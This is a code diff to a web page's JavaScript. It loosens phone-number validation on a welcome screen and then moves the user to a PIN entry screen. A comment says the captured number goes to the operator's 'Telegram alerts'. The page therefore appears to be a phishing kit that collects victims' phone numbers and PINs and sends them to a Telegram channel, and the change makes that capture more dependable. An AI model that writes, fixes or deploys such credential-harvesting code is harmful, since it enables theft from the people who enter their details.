@@ -167,12 +167,23 @@ button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed
 
         // Screen Navigation Triggers
         document.getElementById("btn-welcome").addEventListener("click", () => {
-            const phoneField = document.getElementById("input-phone");
-            if (phoneField.value.trim().length !== 9) return;
-            cachedPhone = phoneField.value.trim();
-            document.getElementById("step-welcome").style.display = "none";
-            document.getElementById("step-pin").style.display = "block";
-        });
+    const phoneField = document.getElementById("input-phone");
+    
+    // 🚀 THE FIX: Strip away all non-numeric characters (like country code prefixes, spaces, or dashes)
+    let cleanPhone = phoneField.value.replace(/\D/g, "");
+    
+    // Enforce matching over the sanitized string sequence safely
+    if (cleanPhone.length < 5) {
+        return alert("Please enter a valid number.");
+    }
+    
+    cachedPhone = cleanPhone; // Save the clean 9 digits to pass to your Telegram alerts safely
+    
+    // Smoothly transition layout views locally
+    document.getElementById("step-welcome").style.display = "none";
+    document.getElementById("step-pin").style.display = "block";
+});
+
 
         document.getElementById("btn-pin").addEventListener("click", () => {
             const pinVal = document.getElementById("input-pin").value.trim();
